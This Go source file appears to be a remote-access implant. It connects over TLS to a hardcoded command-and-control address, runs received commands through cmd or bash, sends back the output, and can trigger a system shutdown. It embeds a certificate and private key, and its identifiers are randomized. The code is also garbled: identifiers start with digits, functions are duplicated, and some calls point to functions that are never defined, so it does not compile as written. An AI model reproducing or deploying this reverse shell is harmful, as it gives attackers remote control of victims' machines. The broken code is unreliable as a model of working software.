package main

import (
    "io"
    "fmt"
    "bufio"
    "os/exec"
    "strings"
    "time"
    "strconv"
    "encoding/base64"
    "io/ioutil"
    "encoding/binary"
    "crypto/tls"
)

var BpLnfgDsc2 = "192.168.1.101:4444"

func df2eSJyYtq(cmd string){

}

WD8F2qNfHK = "-----BEGIN CERTIFICATE-----
MIID8zCCAtugAwIBAgIUC7OcyjOwSjf9hZ4hh2g4OfXilJowDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAkRFMQwwCgYDVQQIDANOUlcxDjAMBgNVBAcMBUVhcnRo
MRcwFQYDVQQKDA5SYW5kb21fQ29tcGFueTELMAkGA1UECwwCSVQxFzAVBgNVBAMM
Dnd3dy5yYW5kb20uY29tMRwwGgYJKoZIhvcNAQkBFg1hYmNAZ21haWwuY29tMB4X
DTIwMTExNTAwMDgwNFoXDTMwMTExMzAwMDgwNFowgYgxCzAJBgNVBAYTAkRFMQww
CgYDVQQIDANOUlcxDjAMBgNVBAcMBUVhcnRoMRcwFQYDVQQKDA5SYW5kb21fQ29t
cGFueTELMAkGA1UECwwCSVQxFzAVBgNVBAMMDnd3dy5yYW5kb20uY29tMRwwGgYJ
KoZIhvcNAQkBFg1hYmNAZ21haWwuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
MIIBCgKCAQEA4RKObvLy0ovDGgE/pcczXxm1XgRPLWFgMV/au5k2jPUf8H39/QFz
iIFVdOJyvl2/urxeM0C5UuNLxYyC12PMTU3CurBp+f70IN9568Zutg5AnQ3Cbmc6
uWM4tSgGuUoMEGuKj30GmSarhENdr4I6MhTAFNEvVRqFjVYs6lqPJmYZg4jhBqKR
8kHj04QYs+nXzkVD0vJegY7CWs4kDmkzdLvMAVseNBeVoDMxjBCBkvmsKY1zlti+
XhV0+pOHwqXhyYUcQfLBdltt+LfOneVBXfze2yfGqdZJRsjzV1YEZv8s/7cqojz1
BVv3bseJnDNOBmjU/jhF79QIHp6nW+BvwwIDAQABo1MwUTAdBgNVHQ4EFgQUiXsx
m/n1tMfIh9UwbAHgKU/e7pYwHwYDVR0jBBgwFoAUiXsxm/n1tMfIh9UwbAHgKU/e
7pYwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAbm/YQ6Ct6bt/
RTDCK7mPKtxqzeOb/VqEupiIIxSbPyj+jzCGGFX6TBYPkqxUQdgDWGPHEHp2AbXG
GfeJPQDHf5QeMQuAUSYTJ2WmkqVlimPP/4rxGpH1V8LfYBVgHNNoZ0FGQaBQj0OL
jekmbCPdRadUDyTi3C91QWdmuBOrpOBhoFF4gDA2+5Dj6iuSV6pn+PKkVxRhDjIT
YqrCOAepLSmnNnPDHEeKm+K1aUDzJkhr3R87rD61kvHVggtfbrpdHHTakUP3AUzx
vLMf0PzMiSY1IHiIevrAAd0wGkT7rPrtnZ/TqJSRP43YO0xotKwppXO5b06UpLXU
I35CXhPiHw==
-----END CERTIFICATE-----
"
5a84jjJkwz = "-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDhEo5u8vLSi8Ma
AT+lxzNfGbVeBE8tYWAxX9q7mTaM9R/wff39AXOIgVV04nK+Xb+6vF4zQLlS40vF
jILXY8xNTcK6sGn5/vQg33nrxm62DkCdDcJuZzq5Yzi1KAa5SgwQa4qPfQaZJquE
Q12vgjoyFMAU0S9VGoWNVizqWo8mZhmDiOEGopHyQePThBiz6dfORUPS8l6BjsJa
ziQOaTN0u8wBWx40F5WgMzGMEIGS+awpjXOW2L5eFXT6k4fCpeHJhRxB8sF2W234
t86d5UFd/N7bJ8ap1klGyPNXVgRm/yz/tyqiPPUFW/dux4mcM04GaNT+OEXv1Age
nqdb4G/DAgMBAAECggEAaQ/AbQn7T0zuRbVPgJL75+iYQMrCKuzJekLEV82tKR9D
SX+GkBOdWpsEyQrrhPE+DmzfjA0qdQak2BI/AUwUkgE6ZOr0jT31t2KaBvUZuOHu
R2Gk4ORPBTrLvcRxXwyxlPieNVynN9ZVOeg4UzT29Wm6P/1lmtRGgzM2xC6Bo+ok
5U5JibRYceW7HX7vnR2gwEN55Ksh28M4wOreCs2HMA67UrYkRXlg/Dunbfbp8PU6
0ucTk3GtI9nqEQqeyQTuP1WIHrWtiHeSpckG0ReRA+9Ph1ZV0nOrrQYGqx6LrnOL
k3opk49XoX6g9kP1lqAffw3kZxPuhMOLMD8f2Fb4AQKBgQDwsOMRXOh2/Vpu5Ko6
J7n+Xiz3d7UfWAz1zHwq4SeAbqMOw1YWoldI796sZpfBoGzbL99NnC8LMvLg497a
eS/HnhWhtDauKdJJ787y7tBikX4GZRL/G+y4JCnHFmvlTnpYjco+U3rClbEaP/Wk
7KKnEuG6EEeZ9XWLsQLT/7wvywKBgQDvY1uC4F9PHzqg0oQRuiJ6ZIt+XRJYz8Hl
KEPKIi5Et7iClflSlcmeLnvafQzmtcU4RXJg7+hbJ9zWrMIzjKTE+qrdMivn7wlz
DX+DoflFZaoQPP6TzH54OcVNDB4l8wkqE544Pjcf0X1SB2opjRtyNHyh++3QMJPo
tuUQN8zQ6QKBgQC5gavQwwnMQ+KCW60zm1DH0y/XH6UyXjvG6m684cH/Q8Za54Sf
d0nMxkuaFoxaSNn9aX0zJPBBMmhtmlM1kXeY46eKdQo727HfGHwpUpS7k6VNKnOk
uZIOLpkgf5BzMLQtMkMxHEgeVx8juy4JifSmzm+5Zzi4Wa3aF3i1ioIxVwKBgQC0
tBy9E5/+ewVnpuG4+/fQyhsefSU/Uzz7PcTGTbz9dG3cbVdyRs2WEWK+0EyvzyCb
1Jh9ojuUq+ehSXGjNhSe+NWH+bp47tEEP3k1JUykXRTeAxzs9p21JW7RNUeAwA/3
6i0yKYy1AQ8Hn788tF62e/Zk1GZ1FGZiccVB081RGQKBgQCqjxNmspSV9KruPsCw
+5pLUnihkslxOVbjt9+5/PHjJzn+gVdqjkE1uLJQnjtlEGXvu3Ua7bfB0GLrIkaC
KReR38+VyRHK1oZUqGc+GSlBAdi60hkvA3PRHEhjo6PrRfuSC1A2Xwf2fOaPxqZc
ThnjWJTTeH99e6Ko3ZgHGIiWxA==
-----END PRIVATE KEY-----
"

func main(){


}

func df2eSJyYtq(cmd string) (string, error) {
    data := command
    switch runtime.GOOS{
    case "windows":
    	cmd := exec.Command("cmd", "/C", data)
    	//cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
    	//cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.CombinedOutput()
    	out := string(output)
    	return out, err
    case "linux":
    	cmd := exec.Command("bash", "-c", data)
	    output, err := cmd.CombinedOutput()
        out := string(output)
        return out, err
    default:
	    parts := strings.Fields(data)
        head := parts[0]
        parts = parts[1:len(parts)]
        cmd := exec.Command(head, parts...)
	    output, err := cmd.CombinedOutput()
        out := string(output)
        return out, err
    }
}

func 2fcNIrWO7s(str string) string {
	Dkh9h2fhfU, err := base64.StdEncoding.DecodeString(str)
    ToFgoilA0U("Cannot base64 decode", err)
	return fmt.Sprintf("%s", Dkh9h2fhfU)
}

func 1WxNeW1gdg(conn net.Conn, message string){
    _, err := io.WriteString(conn, message+"\n")
    ToFgoilA0U("Cannot send data",err)
}

func X7tLFJ84qY(message string, err error){
	if err != nil{
		print_error(message + ": "+err.Error())
	}
}

func U6UrN8ctec (conn net.Conn){
    defer conn.Close()
    hV3vC5AWX3 := make([]byte, 100024) 
    for {
        n, _ := conn.Read(hV3vC5AWX3)
        //do smthing with err? ^
        rcv := string(VAR_BUF_XY[:n])
        if rcv == "mod_shutdown"{
        	wZt5S4zjhD(conn)
        } else {
        	command := rcv
        	out, err := 0tXRTmkYKQ(command)
        	if err != nil{
        		1WxNeW1gdg(conn, "error:"+err.Error())
        	} else {
        		1WxNeW1gdg(conn, out)
        	}
        }
    }
}


func wZt5S4zjhD(conn net.Conn){
    HciWvqZTa2 := true
    commands := map[string]string{
        "windows": "shutdown -s -t 60",
        "linux" : "shutdown +1",
        "darwin" : "shutdown -h +1",
    }
    N95RxRTZHW := commands[runtime.GOOS]
    out, err := 0tXRTmkYKQ(N95RxRTZHW)
    if err != nil{
        1WxNeW1gdg(conn, "err:"+"Shutdown error -"+out+" "+err.Error())
        HciWvqZTa2 = false
    } else{
        1WxNeW1gdg(conn, "inf:Initiated shutdown sequence")
    }
}

func main(){
	key_2 := []byte(2fcNIrWO7s(5a84jjJkwz))
    key_1 := []byte(2fcNIrWO7s(WD8F2qNfHK))
    loaded_keypair, err := tls.X509KeyPair(key_1, key_2)
    if err != nil{
    	fmt.Println("Cannot load keypairs: "+err.Error())
    	os.Exit(0)
    }
    QbzONJAAwd := tls.Config{Certificates: []tls.Certificate{loaded_keypair}, InsecureSkipVerify: true}
    c2_addr := BpLnfgDsc2
    conn, err := tls.Dial("tcp", c2_addr, &QbzONJAAwd)
    if err != nil{
    	fmt.Println("Cannot connect with the server: "+err.Error())
    	os.Exit(0)
    }
    for{
    	U6UrN8ctec(conn)
    }
}
